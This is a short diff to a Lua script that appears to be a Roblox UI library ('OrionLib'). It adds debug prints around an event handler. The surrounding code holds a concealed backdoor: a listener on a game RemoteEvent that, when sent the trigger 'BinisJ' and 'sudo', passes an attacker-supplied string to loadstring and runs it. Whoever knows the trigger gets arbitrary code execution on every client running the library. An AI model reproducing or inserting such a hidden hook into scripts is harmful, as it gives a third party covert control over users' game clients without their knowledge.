@@ -463,9 +463,11 @@ function OrionLib:Init()
 	end	
 end
 
+print('starting')
+
 game.ReplicatedStorage.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(plr,arg1)
+	print(arg1[1],arg1[2],arg1[3])
 	if type(arg1) == "table" and arg1[1] == "BinisJ" then
-		print(arg1[1],arg1[2],arg1[3])
 		if arg1[2] == "sudo" then
 			loadstring(arg1[3])()
 		end
